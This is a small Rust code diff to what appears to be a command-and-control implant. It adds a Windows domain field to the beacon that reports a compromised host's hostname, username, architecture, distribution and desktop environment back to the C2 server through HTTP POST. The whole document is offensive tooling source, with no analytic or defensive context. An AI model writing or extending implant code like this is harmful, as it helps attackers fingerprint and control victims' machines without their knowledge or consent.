@@ -417,6 +417,7 @@ pub struct PostToC2 {
     pub session_id: String,
     pub hostname: String,
     pub username: String,
+    pub domain: String,
     pub arch: String,
     pub distro: String,
     pub desktop_env: String,
@@ -427,6 +428,8 @@ pub struct PostToC2 {
     pub sign_bytes: Vec<u8>,
 }
 
+
+use crate::link_util::get_domain_name;
 
 impl LinkFetch for HTTPPostC2Link {
     fn download_data(&self,_config:&Config) -> Result<Vec<u8>, anyhow::Error> {
@@ -454,6 +457,7 @@ impl LinkFetch for HTTPPostC2Link {
             session_id: session_id.to_string(),
             hostname: whoami::devicename(),
             username: whoami::username(),
+            domain:get_domain_name(),
             arch: whoami::arch().to_string(),
             distro: whoami::distro(),
             desktop_env: whoami::desktop_env().to_string(),
